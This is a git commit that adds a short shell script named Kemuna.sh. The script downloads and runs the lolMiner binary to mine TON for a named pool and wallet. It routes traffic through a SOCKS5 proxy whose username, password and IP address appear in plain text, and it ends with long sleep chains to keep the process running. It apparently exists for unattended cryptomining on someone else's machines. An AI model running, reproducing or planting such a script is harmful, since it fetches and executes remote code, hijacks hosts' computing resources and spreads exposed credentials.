0d35485bd8f981617b25069e6c4bebb3be255fd1
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-02 23:46:42 +0700

    Create Kemuna.sh

---
+++ Kemuna.sh
@@ -0,0 +1,3 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar -xvf lolMiner_v1.41b_Lin64.tar.gz && cd 1.41b && ./lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQBovP38ruocodmwpj0C05XgyuNKgg6qZUjUEuAWoaWYbUN7 socks5://Novax:chalHatt@129.158.58.77:1080
+
+sleep 99 && sleep 999 && sleep 9999 && sleep 99999
